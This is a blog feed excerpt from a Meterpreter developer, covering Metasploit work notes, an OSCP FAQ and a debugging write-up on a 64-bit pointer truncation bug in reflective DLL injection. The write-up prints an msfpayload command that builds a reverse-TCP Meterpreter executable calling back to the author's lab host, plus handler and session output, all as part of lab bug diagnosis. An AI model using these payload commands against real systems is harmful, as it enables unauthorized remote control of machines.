<p>OPTIONS:</p>

<pre><code>-h        Help banner
-m &lt;opt&gt;  Maximum results to return.
-p &lt;opt&gt;  Result set page size.
</code></pre>

<h1>windows.old Computers</h1>

<p>name     distinguishedname                                 description      comment</p>

<hr />

<p>WIN2K    CN=WIN2K,OU=Domain Controllers,DC=windows,DC=old  This is a TEST.<br/>
schmidt  CN=schmidt,CN=Computers,DC=windows,DC=old         test PC</p>

<p>Total computers: 2
```</p>

<p>If you like this idea, then watch carefully because this should be landing in a Metasploit installation near you very soon.</p>

<h2>Doxygen documentation</h2>

<p>Documentation. It&rsquo;s the downfall of almost every software project. Open Source tends to suffer more so. Meterpreter&rsquo;s history has been slightly tarnished thanks to the lack of documentation, but that is something that we&rsquo;re working to fix. The issue of documentation can be solved in many ways, and the way that we&rsquo;ve decided to start solving the problem with Meterpreter is by using <a href="http://www.doxygen.org/">Doxygen</a> and slowly, but surely, work our way through the source and add whatever documentation we can.</p>

<p>Needless to say this is a big job. The team is aiming to write more documentation with each commit so that we can cover the source base during the course of doing normal work.</p>

<p>The generated Doxygen documentation can be found on the <a href="https://ci.metasploit.com/job/MeterpreterWinDocs/lastSuccessfulBuild/artifact/docs/html/index.html">Metasploit CI server</a>. This gets updated each time a new build is created, so it should always reflect what is currently in the <code>master</code> Meterpreter branch.</p>

<p>People who are interested in getting involved in Meterpreter should look to start by pulling the source, reading bits of code and adding documentation. It might not be glamorous, but it&rsquo;s very much appreciated and is a great way to get familiar with the source before diving into code contributions.</p>

<h2>What&rsquo;s Next?</h2>

<p>I&rsquo;m happy to say that Rapid7 are keeping me on for a while longer! There&rsquo;s always more to do with Meterpreter and never enough time to do it. While I can&rsquo;t say for sure what will be done next, I can generalise by saying that it&rsquo;ll most likely include:</p>

<ul>
<li>Fixing compatibility issues with newer versions of Windows, particularly with regards to things like packet capture, pivoting, etc.</li>
<li>Resolving the issue with non-tcp payload binaries failing to shutdown.</li>
<li>Removing the last of the issues that result in crashes or general instability.</li>
<li>Updating <code>mimikatz</code> to v2.0 (already in progress!).</li>
<li>Trying to improve Meterpreter&rsquo;s stealth and protect it from being investigated.</li>
<li>Finalising the streaming work so that <code>clipboard_monitor</code> can become a reality.</li>
<li>Adding improvements and features to things like the ADSI support and <code>extapi</code> (coming very soon).</li>
<li>Working through the general backlog of bugs.</li>
<li>Working on some things that I won&rsquo;t talk about publicly.</li>
<li>Hopefully keeping the Rapid7 folks happy so that I can continue to work with them.</li>
</ul>


<p>If you have suggestions, let&rsquo;s hear them! Even better, submit a PR, and to encourage you:</p>

<blockquote><p>I will personally send a quality, quintessentially Australian fluffy crocodile toy via snail-mail to the first non-Rapid7 person who submits a pull request with a non-trivial fix or contribution to Meterpreter.</p></blockquote>

<p>That&rsquo;s right, you could be a winner of some Oz awesome! So get coding, it&rsquo;s not that hard&hellip; any more!</p>

<h2>What? Is that it?</h2>

<p>I know it doesn&rsquo;t appear like much for just 3 short months, but yes that&rsquo;s basically it. There are lots of other small fixes, tweaks, adjustments, etc. along the way but nothing that really kept me tied up for extended periods like the stuff that&rsquo;s listed in here. I&rsquo;m aiming to lift the throughput, but as time goes by it gets <em>harder</em> to add big chunks of value. However, the job of someone like me is to make myself obsolete, as that would imply there&rsquo;s nothing more I can do to make it better. In other words, I&rsquo;ll have made it as good as I am capable of making it.</p>

<h2>Gratitude</h2>

<p>I&rsquo;ve had an absolute blast working on Meterpreter these last few months, and I want to publicly acknowledge some folks who have been super supportive since I started. The first is <a href="https://twitter.com/todb">Tod</a> for giving me the chance to work with Rapid7 in the first place, and for being awesome to work for/with since kicking off. I&rsquo;ve thoroughly enjoyed being part of his team. I&rsquo;m also <em>very</em> grateful that he&rsquo;s happy for me to stay on a bit longer to do more!</p>

<p>Second is <a href="https://twitter.com/egyp7">Egypt</a>. Not only is this bloke super smart and super nice, but he seems to have unending patience when it comes to me and my stupid questions. It&rsquo;s humbling to be in the presence of this guy, and it was a career highlight to meet him this year at <a href="https://ruxconbreakpoint.com/">BPX</a>/<a href="http://ruxcon.org.au/">Rux</a> and get to share some stories over a scotch or three.</p>

<p>Next, a collective holler to the other legendary Rapid7 folk who put up with me every day and who are a constant source of inspiration and learnings: <a href="https://twitter.com/TheLightCosine">TheLightCosine</a>, <a href="https://twitter.com/_juan_vazquez_">Juan</a>, <a href="https://twitter.com/_sinn3r">sinn3r</a>, <a href="https://twitter.com/wvuuuuuuuuuuuuu">wvu</a> and <a href="https://twitter.com/hdmoore">HD Moore</a>. Just being present when these people have a conversation is enough to make me realise how much more I need to learn and vast their abilities are. Thanks to you all for your time and support. I am easily the dumbest guy in the room which means I&rsquo;m in the right room!</p>

<p>To the general security community folk who, despite not being involved with Rapid7, have given me time and support beyond that which I deserve while working on Meterpreter and trying to make the jump into the security field: <a href="https://twitter.com/pipes">Pipes</a>, <a href="https://twitter.com/mubix">Mubix</a>, <a href="https://twitter.com/kernelsmith">Kernelsmith</a>, <a href="https://twitter.com/Meatballs__">Meatballs</a> (thanks for landing those PRs!), <a href="https://twitter.com/zeknox">Zeknox</a>, <a href="https://twitter.com/Mateusz_Jozef">Matthew Risck</a>, <a href="https://twitter.com/smilingraccoon">SmilingRaccoon</a>, <a href="https://twitter.com/justinsteven">Justin</a>, <a href="https://twitter.com/radac_">radac</a>, <a href="https://twitter.com/sw1tch1ng">sw1tch</a>, <a href="https://twitter.com/sebbity">Novex</a>, <a href="https://twitter.com/ashd_au">Ash</a> and <a href="https://twitter.com/wadealcorn">Wade</a> &hellip; and many others. You&rsquo;re all bloody legends.</p>

<p>I hope I get to continue working on this amazing piece of kit with all these amazing people. I haven&rsquo;t had this much fun in <em>years</em>.</p>

<p>Thanks to you all for reading. I hope you enjoyed it and I hope it broke down some of the barriers between you and Meterpreter contributions. If there are any questions, hit me up via <a href="/contact">email</a>, <a href="https://twitter.com/TheColonial">Twitter</a> or leave a comment here. If you want to get started with Meterpreter contributions I&rsquo;d certainly love to hear from you.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OSCP FAQ]]></title>
    <link href="http://buffered.io/posts/oscp-faq/"/>
    <updated>2013-12-12T19:01:00+10:00</updated>
    <id>http://buffered.io/posts/oscp-faq</id>
    <content type="html"><![CDATA[<p>Since publishing the article that detailed my experiences with the <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/">PWB</a> labs and the <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a> exam, I have received scores of emails from potential and current students searching for more information and (quite often) hints. While I do my best to answer most of them, it&rsquo;s close to impossible to get to them all as my email debt is already way too high.</p>

<p>From this point on I have decided not to respond to questions directly via email. This post will stand instead of those emails as a point of reference for common OSCP-related questions. As more questions come in I will update this post so that all future readers can benfit from the answers without me having to repost them.</p>

<!--more-->


<blockquote><p>Do I need to be good at programming to do PWB?</p></blockquote>

<p>I&rsquo;d say <em>no</em>, but it really does help. If you&rsquo;re not good with at least one language, then you&rsquo;re going to have a harder time and you&rsquo;ll probably end up needing to purchase time extensions to get through the labs. Scripting and coding is an important part of the experience, and it&rsquo;s something you really should be able to do. You could probably get through the labs without it, but it will be difficult. My recommendation is to go and spend time learning a language like <a href="http://www.python.org/">Python</a>, <a href="http://www.ruby-lang.org/">Ruby</a> or even <a href="http://en.wikipedia.org/wiki/Bash_(Unix_shell)">Bash</a> so that you have the ability to automate some of the tasks you&rsquo;ll have to take on.</p>

<blockquote><p>Should I do OSCP first, or should I take on other certs (such as <a href="https://www.eccouncil.org/Certification/certified-ethical-hacker">CEH</a>, <a href="http://www.giac.org/certification/penetration-tester-gpen">GPEN</a> or <a href="http://mile2.com/penetration-testing-ethical-hacking/cpte.html">CPTE</a>) as preparation?</p></blockquote>

<p>I haven&rsquo;t done CEH, GPEN or CPTE. In fact, to date, OSCP is the only security certification I have attempted to tackle (though I will be taking <a href="http://www.offensive-security.com/information-security-training/cracking-the-perimeter/">CTP</a> later this month with a goal of nailing <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/">OSCE</a> in January). As a result I don&rsquo;t have a valid opinion of the quality or usefulness of the other certifications. My feeling is that it&rsquo;s down to you, dear reader, to determine which is best for you, just as I did when I was looking for a challenge. If you feel that OSCP is out of your depth then by all means go and find something easier.</p>

<blockquote><p>Is there much web application hacking involved?</p></blockquote>

<p>It&rsquo;s hard to quantify &ldquo;much&rdquo;, but yes there is a bit of hacking of web applications involved. Some are known applications, some are custom applications built specifically for the labs. If you&rsquo;re not across the basics before you start, be prepared to ramp up quickly once your lab time commences.</p>

<blockquote><p>Do I need to know about assembly language?</p></blockquote>

<p>There are parts of the course which require you to have a basic understanding of assembly, though only x86 and not x64. I think it&rsquo;s a good idea to get your hands dirty prior to taking the course, because you will be using and adjusting exploits during your lab time.</p>

<blockquote><p>How many hours per day did you spend in the labs? Is an hour per day enough?</p></blockquote>

<p>The short answer is that I spent as many as I possibly could. I paid for just 30 days in the lab which meant that I had to force myself to push hard to get through as many machines as possible without having to pay for more time. It was a cost saver and a personal quest at the same time. On average, my guess is that I spent four or so hours per day, and more on weekends. One hour per day would not be enough, in my opinion, even if you booked 90 days worth of lab time.</p>

<p>My recommendation is to do your best to have larger, unbroken blocks of time rather than lots of smaller chunks of time. This gives you the chance to immerse yourself in a problem and maximises the possibility of you solving it without the context-switching which can be really distruptive to your thought process.</p>

<p>PWB is hard, don&rsquo;t expect to get through it in an hour per day unless you&rsquo;re a guru with lots of experience.</p>

<blockquote><p>Can you please give me a hint for <strong>&lt;machine name&gt;</strong> in the PWB labs, because I&rsquo;m stuck?</p></blockquote>

<p>No. PWB and OSCP is all about learning to learn. The journey is probably more important than the final destination. I will not give hints, and if you ask for them you&rsquo;ll more than likely receive no response from me. If I do respond, I will probably just say &ldquo;Try Harder&rdquo;.</p>

<blockquote><p>Can I please see your lab notes?</p></blockquote>

<p>Absolutely not.</p>

<blockquote><p>I have been a developer for many years and want to try for OSCP, is it a waste of time?</p></blockquote>

<p>No, it&rsquo;s not a waste of time, and yes you shoud try for it. This is exactly the scenario I was in, and I don&rsquo;t regret doing it for a one second. Also, I do believe that anyone who is involved with building production systems should do this course as it really does open your eyes. Most developers haven&rsquo;t really got much visibility of what things are like on the front line when it comes to security. This course is the kind of thing that will make them think much more defensively when writing their code.</p>

<blockquote><p>Will OSCP provide me with the skills I need to be a penetration tester?</p></blockquote>

<p>OSCP by itself will not. I think the only thing that can really give you the skills is experience. However, OSCP is a great start and it gives a great foundation on which to build a career as a penetration tester.</p>

<p>In other words, don&rsquo;t stop learning!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[64bit Pointer Truncation in Meterpreter]]></title>
    <link href="http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter/"/>
    <updated>2013-09-14T07:25:00+10:00</updated>
    <id>http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter</id>
    <content type="html"><![CDATA[<p>If you haven&rsquo;t ever heard of <a href="https://github.com/rapid7/meterpreter" title="Native Meterpreter">Meterpreter</a> before, you might want to go and take a look at it before reading this post to help give some context. In short, Meterpreter is an amazing library that is part of the <a href="http://www.metasploit.com/" title="Metasploit Framework">Metasploit Framework</a> and can be used to give you tremendous power and control over target machines during a <a href="http://en.wikipedia.org/wiki/Penetration_test" title="Penetration Testing">penetration test</a>. Anyone and everyone in the security game is most likely familiar with both Metasploit and Meterpreter, at the very least, if not closely intimate with them. The toolset is fantastic, and is <a href="https://github.com/rapid7/metasploit-framework/" title="Metasploit Framework Source">open source</a>!</p>

<p>I&rsquo;m currently in the very fortunate position of <a href="https://community.rapid7.com/community/metasploit/blog/2013/09/05/weekly-update" title="Weekly Update: Meterpreter Updates, VMWare, the OSX spycam, Retabbing, and more!">working with the crew</a> from <a href="http://www.rapid7.com/" title="Rapid 7">Rapid7</a> to help improve Meterpreter, particularly on the Windows (both 32 and 64 bit). I have a good list of things to work through while I&rsquo;m on board including making it easier to build for potential contributors, and to fix some outstanding issues that the R7 crew haven&rsquo;t had the bandwidth to fix.  These people are super-smart, and super-nice and I&rsquo;m honoured that I&rsquo;ve been selected to work alongside them.</p>

<p>The purpose of this post is to document the process and resolution of a bug that I have helped resolve since joining. I also aim to lift the lid on Meterpreter a little and help expose how some bits of it work. I hope you enjoy.</p>

<!--more-->


<h2>Meterpreter Basics</h2>

<p>When exploiting a vulnerability during a penetration test using Metasploit, you have a number of payloads that you choose to use which give you some sort of control over your target. Of those payloads, Metepreter is not only the most common, but is probably the most powerful.</p>

<p>Once you have an instance of Metepreter running on a target, you&rsquo;ve got quite a lot of control. You can escalate privileges, dump password hashes, launch processes, upload files, and you can even use it as a pivot-point for launching attacks against other non-routable hosts. While the power of all this is enough to bake anyone&rsquo;s noodle, the thing that blows my mind the most is Meterpreter&rsquo;s ability to migrate to other processes. That is, Meterpreter can dynamically load itself into another processes and then reconnect to your Metasploit session seamlessly without any effort from the attacker (ie. you). Simply executing <code>migrate &lt;process id&gt;</code> at the Meterpreter prompt is all it takes.</p>

<p>There are some caveats when it comes to migration. In particular, you need to have permission to write to the target process&rsquo;s memory otherwise the migration will not succeed.</p>

<p>Meterpreter comes in quite a few flavours, including <code>PHP</code>, <code>Python</code>, and <code>native/C</code> for Linux and Windows. Some implementations are more feature-rich than others, but they all have common functionality which makes it easy to perform a variety of functions on a compromised host.</p>

<p>We&rsquo;ll be focusing on the Windows native payload in this post, and in particular we&rsquo;ll be looking at how Meterpreter is loaded and executed.</p>

<h2>Reflective DLL Injection</h2>

<p>Simply put, Reflective DLL Injection is a method for injection a DLL into a process. No surprises there. However, it has some nifty properties that make a great candidate for use in tools such as Meterpreter. Some of those points include:</p>

<ul>
<li>Position-independence.</li>
<li>Lack of host system registration.</li>
<li>Largely undetectable on the target at both a system and process level.</li>
</ul>


<p>The canonical paper [<a href="http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf" title="Reflective DLL Injection">PDF</a>], written by <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>, is well worth reading and can be found on the <a href="http://harmonysecurity.com/" title="Harmony Security">Harmony Security</a> website. Read it. It&rsquo;s amazing, and does a much better job of explaining itself than I could ever hope to. I would like to point out that there&rsquo;s a multi-stage process involved which includes:</p>

<ul>
<li>Writing the code to an executable area of memory.</li>
<li>Executing the loader which creates a valid DLL image in memory.</li>
<li>Calling <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583(v=vs.85).aspx" title="DllMain Entry Point">DllMain</a> on the loaded DLL.</li>
<li>Returning control to the process that invoked it.</li>
</ul>


<p>With that in mind, let&rsquo;s take a look at the bug.</p>

<h2>The Bug</h2>

<p>The bug that was reported related to process migration, and went something like this (paraphrased slightly with a bit more information):</p>

<blockquote><p>Trying to migrate Metepreter between processes on Windows 2012 seems to be
unreliable. It will migrate just fine into some processes, such as <em>explorer.exe</em>,
without any problems. However, spawning another process, such as <em>notepad.exe</em>, and
migrating to it hangs the entire session. Migrating to the <em>winlogon.exe</em> process
crashes the entire user environment on the target host.</p></blockquote>

<p>When I first read this report I thought &ldquo;Wow, how am I going to track this down?&rdquo;, and I&rsquo;ll admit that I was a little intimidated at first, especially given that I knew that the native Windows Meterpreter was using Reflective DLL Injection to load itself into other processes. However, it&rsquo;s been a long time since I&rsquo;d been tasked with something this challenging and so, deep down, I was looking forward to diving in.</p>

<h2>Replication</h2>

<p>The first step was to fire up a Windows 2012 virtual machine and replicate the problem. Windows 2012 only comes in a 64-bit flavour, so picking the right version wasn&rsquo;t a problem.</p>

<p>After installation, I needed to simulate an attack coming from Metasploit so that I could interact with Meterpreter to perform the migration.</p>

<p>Creating a payload to do this is really simple thanks to <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" title="msfpayload">msfpayload</a> (part of Metasploit). On my <a href="http://www.backtrack-linux.org/" title="Backtrack Linux">Backtrack</a> VM I used the following command to generate the PE image:</p>

<pre><code>root@bt:~# msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.5.26.40 LPORT=443 X &gt; 40-443-x64.exe
</code></pre>

<p>This command creates a 64-bit Windows executable that contains a small stager. This stager connects to <code>10.5.26.40</code> (my Backtrack VM) on port <code>443</code> (I always choose the HTTPS port to avoid potential outbound firewall issues). Once connected it will download the Meterpreter payload and establish a session with Metasploit.</p>

<p>I copied this binary to the Windows 2012 machine ready to execute. At this point, Metasploit needs to be set up and configured to deal with the incoming request. On the Backtrack VM, we run <code>msfconsole</code> and set it up to use <code>multi/handler</code> with the appropriate settings, like so:</p>

<pre><code>msf exploit(handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LHOST     10.5.26.40       yes       The listen address
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre>

<p>With those settings in place, the exploit was ready to fire:</p>

<pre><code>msf exploit(handler) &gt; exploit

[*] Started reverse handler on 10.5.26.40:443 
[*] Starting the payload handler...
</code></pre>

<p>From the Windows 2012 VM I ran the exploit binary and my Metepreter session kicked off:</p>

<pre><code>[*] Sending stage (951296 bytes) to 10.5.26.30
[*] Meterpreter session 1 opened (10.5.26.40:443 -&gt; 10.5.26.30:38516) at 2013-09-11 21:55:52 +1000

meterpreter &gt; getuid
Server username: WIN-URCAUVPE291\OJ Reeves
meterpreter &gt; sysinfo
Computer        : WIN-URCAUVPE291
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/win64
meterpreter &gt; 
</code></pre>

<p>Before trying the failure case, I wanted to make sure that the known success case worked locally first. I decided to migrate to <code>explorer.exe</code> and see if anything changed:</p>

<pre><code>meterpreter &gt; ps

Process List
============

 PID   PPID  Name                Arch    Session     User                       Path
 ---   ----  ----                ----    -------     ----                       ----
 0     0     [System Process]            4294967295                             
 4     0     System                      4294967295                             
 444   4     smss.exe                    4294967295                             
 484   708   svchost.exe                 4294967295                             
 536   524   csrss.exe                   4294967295                             
 604   596   csrss.exe                   4294967295                             
 612   524   wininit.exe                 4294967295                             
 640   596   winlogon.exe                4294967295                             
 692   720   explorer.exe        x86_64  1           WIN-URCAUVPE291\OJ Reeves  C:\Windows\Explorer.EXE
 708   612   services.exe                4294967295                             
 716   612   lsass.exe                   4294967295                             
 804   708   svchost.exe                 4294967295                             
 816   708   svchost.exe                 4294967295                             

... snip ...

meterpreter &gt; migrate 692
[*] Migrating from 1508 to 692...
[*] Migration completed successfully.
meterpreter &gt; getuid
Server username: WIN-URCAUVPE291\OJ Reeves
meterpreter &gt; sysinfo
Computer        : WIN-URCAUVPE291
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/win64
meterpreter &gt; 
</code></pre>

<p>Migration seemed to work. Next I tried the failure case. First I launched <code>notepad.exe</code> and then attempted to migrate to it:</p>

<pre><code>meterpreter &gt; execute -f notepad.exe -t -H
Process 192 created.
meterpreter &gt; migrate 192
[*] Migrating from 692 to 192...
[-] Error running command migrate: Rex::RuntimeError No response was received to the core_loadlib request.
meterpreter &gt;
</code></pre>

<p>The session hung at this point and no Meterpreter commands would work. When I went over to the Windows 2012 VM I saw that there was a notification that the notepad.exe process had crashed. This was great as I was able to reproduce the failure. It was time to investigate the problem.</p>

<h2>Diagnosis</h2>

<p>To help figure out what was going wrong, I enlisted the help of two of my favourite tools: <a href="http://technet.microsoft.com/en-au/sysinternals/bb896647.aspx" title="DebugView">DebugView</a> and <a href="http://en.wikipedia.org/wiki/WinDbg" title="Windbg">Windbg</a>. Coverage of these tools is beyond the scope of the article, so if you want to learn more about them you&rsquo;ll find a stack of information out on the web. Given that this machine was 64-bit and the process we were aiming to debug was 64-bit, I installed the 64-bit version of the <a href="http://msdn.microsoft.com/en-us/windows/hardware/gg463009.aspx" title="Debugging Tools for Windows">Debugging Tools for Windows</a> so that the right version of <code>windbg</code> was available.</p>

<p>Before dabbling with any of the binaries and adding debug detail, I repeated the failure scenario but with one small change: I launched <code>notepad.exe</code> manually and attached to it from <code>windbg</code> prior to performing the migration. I left <code>DebugView</code> running as well to catch any debug messages from processes outside of the one that <code>windbg</code> was attached to.</p>

<p>Upon running the <code>migrate</code> command <code>notepad.exe</code> crashed and <code>windbg</code> caught the exception. This is what it showed:</p>

<pre><code>(ab0.448): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
00000000`707a7b5c ??              ???
</code></pre>

<p>We can see that we&rsquo;re accessing memory that we shouldn&rsquo;t be accessing. But why?</p>

<pre><code>0:003&gt; !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


FAULTING_IP: 
unknown!printable+0
00000000`707a7b5c ??              ???

EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 00000000707a7b5c
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000008
   Parameter[1]: 00000000707a7b5c
Attempt to execute non-executable address 00000000707a7b5c

... snip ...
</code></pre>

<p>The migration process results in an attempt to execute a section of code in an area of memory that isn&rsquo;t marked as executable. Let&rsquo;s confirm that:</p>

<pre><code>0:003&gt; !vprot 00000000707a7b5c
BaseAddress:       00000000707a7000
AllocationBase:    0000000000000000
RegionSize:        000000000f839000
State:             00010000  MEM_FREE
Protect:           00000001  PAGE_NOACCESS
</code></pre>

<p>As we can see the memory area is definitely not marked as executable. But should it be? Should this memory be executable, or are we just pointing to an invalid area of memory? If it was the former, then it might imply that DEP or ASLR are somehow interfering. However, my gut feeling was that it was the latter. A quick look at the contents of the memory at this location would be enough to confirm:</p>

<pre><code>0:003&gt; du 00000000707a7b5c
00000000`707a7b5c  "????????????????????????????????"
00000000`707a7b9c  "????????????????????????????????"
00000000`707a7bdc  "????????????????????????????????"
00000000`707a7c1c  "????????????????????????????????"
00000000`707a7c5c  "????????????????????????????????"
00000000`707a7c9c  "????????????????????????????????"
00000000`707a7cdc  "????????????????????????????????"
00000000`707a7d1c  "????????????????????????????????"
00000000`707a7d5c  "????????????????????????????????"
00000000`707a7d9c  "????????????????????????????????"
00000000`707a7ddc  "????????????????????????????????"
00000000`707a7e1c  "????????????????????????????????"
</code></pre>

<p>It&rsquo;s pretty clear that no valid code is located in this area of memory. This implied that there was a possibility that a pointer to an area of code is somehow going awry. But where? To find this out, I needed to add some more debug output to Meterpreter.</p>

<p>Next, I opened the Meterpreter source in Visual Studio 2012 (freshly moved from VS 2010 by yours truly) and prepared to rebuild the binaries with some extra debug output. I littered the code with <a href="http://msdn.microsoft.com/en-us/library/windows/apps/aa363362(v=vs.85).aspx" title="OutputDebugString function">OutputDebugString</a> calls at various key locations, enabled the existing logging that was built into the source, and rebuilt the suite of binaries from scratch. Once built, I deployed them to my Backtrack VM, fired up <code>DebugView</code> on the Windows 2012 VM and repeated the process (including attaching to <code>notepad.exe</code> with <code>windbg</code>). Here&rsquo;s a snippet of the output:</p>

<pre><code>[SERVER] Initializing...
[SERVER] module loaded at 0x350B0000
[SERVER] main server thread: handle=0x00000138 id=0x000008F0 sigterm=0x334D7B20
[SERVER] Using SSL transport...
[SERVER] Initializing tokens...
[SERVER] Flushing the socket handle...
[SERVER] Initializing SSL...
[SERVER] Negotiating SSL...
ModLoad: 000007ff`58060000 000007ff`58075000   C:\Windows\system32\NETAPI32.DLL
ModLoad: 000007ff`586d0000 000007ff`586de000   C:\Windows\system32\netutils.dll
ModLoad: 000007ff`5b020000 000007ff`5b044000   C:\Windows\system32\srvcli.dll
ModLoad: 000007ff`58020000 000007ff`58035000   C:\Windows\system32\wkscli.dll
ModLoad: 000007ff`5ad10000 000007ff`5ad2a000   C:\Windows\system32\CRYPTSP.dll
ModLoad: 000007ff`5a990000 000007ff`5a9d9000   C:\Windows\system32\rsaenh.dll
[SERVER] Sending a HTTP GET request to the remote side...
[SERVER] Completed writing the HTTP GET request: 27
[SERVER] Registering dispatch routines...
Registering a new command (core_loadlib)...
Allocated memory...
Setting new command...
Fixing next/prev...
Done...
[SERVER] Entering the main server dispatch loop for transport 0...
[DISPATCH] entering server_dispatch( 0x334D7B60 )
[SCHEDULER] entering scheduler_initialize.
[SCHEDULER] leaving scheduler_initialize.
[DISPATCH] created command_process_thread 0x33523030, handle=0x000001F0
[COMMAND] Processing method core_loadlib
[COMMAND] core_loadlib: Entry
[COMMAND] core_loadlib: libraryPath (ext264209.x64.dll) flags (2)
[COMMAND] core_loadlib: lib does not exist locally (being uploaded)
[COMMAND] core_loadlib: lib is not to be stored on disk
[LOADLIBRARYR] starting
[LOADLIBRARYR] GetReflectiveLoaderOffset
[LOADLIBRARYR] GetReflectiveLoaderOffset (5488)
[LOADLIBRARYR] Calling VirtualProtect lpBuffer (0000008935318B20) length (428544)
[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
ModLoad: 000007ff`555e0000 000007ff`55600000   C:\Windows\system32\WINMM.dll
ModLoad: 000007ff`555a0000 000007ff`555d2000   C:\Windows\system32\WINMMBASE.dll
ModLoad: 000007ff`57e00000 000007ff`57e2c000   C:\Windows\system32\IPHLPAPI.DLL
ModLoad: 000007ff`57de0000 000007ff`57dea000   C:\Windows\system32\WINNSI.DLL
[LOADLIBRARYR] Calling pDllMain (0000000033449BEC)
(9b8.968): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
00000000`33449bec ??              ???
</code></pre>

<p>The extra debug calls that I added to the source are those marked with <code>[LOADLIBRARYR]</code>. These calls were located in the guts of the reflective DLL injection code.</p>

<p>As we already know from earlier in this post, the reflective DLL injection code dynamically builds a valid DLL image in memory and then invokes it. The method which builds this DLL image is called <code>ReflectiveLoader()</code> and is invoked in code via a pointer called <code>pReflectiveLoader</code>, which you can see in the above output. At the end of the <code>ReflectiveLoader()</code> function, a reference to <code>DllMain()</code> is resolved and invoked directly prior to returning control to the caller.</p>

<p>Once this function returns, the Meterpreter-specific code then calls <code>DllMain()</code> again, using the value returned from <code>ReflectiveLoader()</code>, to invoke some functionality required by the Metasploit framework. In the above output, you can see the pointer to <code>DllMain()</code> called <code>pDllMain</code>, and this is the pointer that&rsquo;s used to make the call.</p>

<p>What was interesting about the log is that the first call to <code>DllMain()</code> that is invoked in the body of <code>ReflectiveLoader()</code> worked fine, otherwise the process would have crashed prior to the line that outputs the value of the <code>pDllMain</code> variable. Instead, it was the <em>second</em> call to <code>DllMain()</code> via the <code>pDllMain</code> pointer that caused the crash. This implied that the memory address that was being returned from <code>ReflectiveLoader()</code> was incorrect.</p>

<p>The nature of the reflective loading mechanism implied to me that the addresses of <code>pReflectiveLoader</code> and <code>pDllMain</code> should actually be quite close together in memory. However, focussing on a small part of the output, I noticed the following:</p>

<pre><code>[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
[LOADLIBRARYR] Calling pDllMain          (0000000033449BEC)
</code></pre>

<p>Those two pointers were nowhere near each other! The more perceptive of you will have noticed that the <code>pDllMain</code> pointer appeared to have lost its higher-order <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a>. The pointer had in fact been truncated!</p>

<p>But why? It wasn&rsquo;t immediately obvious to me what the reason was, but I was keen to validate that this was the case. To prove my theory, I hacked the code a little so that the higher-order DWORD of the <code>pReflectiveLoader</code> value was used as the higher-order DWORD of <code>pDllMain</code> as well. The hack looked something like this:</p>

<p>{% codeblock lang:c %}
ULONG_PTR ulReflectiveLoaderBase = ((ULONG_PTR)pReflectiveLoader) &amp; (((ULONG_PTR)-1) ^ (0xFFFFFFFF));
pDllMain = (DLLMAIN)(pReflectiveLoader() | ulReflectiveLoaderBase);
{% endcodeblock %}</p>

<p>After the above code, <code>pDllMain</code> would have the same higher-order DWORD value as <code>pReflectiveLoader</code>. I compiled, deployed, executed &hellip;</p>

<p>&hellip; and it worked!</p>

<h2>Resolution</h2>

<p>Armed with the knowledge earned from the above diagnosis, I set about looking through the code to see why this pointer was being truncated. Clearly the value was perfectly fine prior to being returned from <code>ReflectiveLoader()</code>, so why was it truncated upon return?</p>

<p>I spent quite a bit of time looking around, and I didn&rsquo;t find anything. Nothing was leaping out at me. I felt really stupid. So instead of beating about the bush, I contacted the man himself, the author and creator of Reflective DLL Injection himself, Mr <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>. I explained the situation to him, detailed my findings and asked if he any idea as to why this problem might be occurring.</p>

<p>It didn&rsquo;t take long to get a response. Stephen jumped on the issue straight away, fixed it and submitted a <a href="https://github.com/rapid7/meterpreter/pull/14">pull request</a> to the Meterpreter repository before emailing me back with details of the solution. Talk about great service!</p>

<p>When I saw the solution I immediately felt stupid for missing it myself. In hindsight I should have known to look in this location. I ate some humble pie and savoured the taste while expressing my gratitude to Stephen for his prompt response.</p>

<p>So what was it?</p>

<p>The <code>pReflectiveLoader</code> pointer is a function pointer of a type defined like so:</p>

<p>{% codeblock lang:c %}
typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
{% endcodeblock %}</p>

<p>However, the <code>ReflectiveLoader()</code> function was defined in the source like so:</p>

<p>{% codeblock lang:c %}</p>

<h1>ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )</p>

<h1>else</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )</p>

<h1>endif</h1>

<p>{</p>

<pre><code>// ... snip ...
</code></pre>

<p>}
{% endcodeblock %}</p>

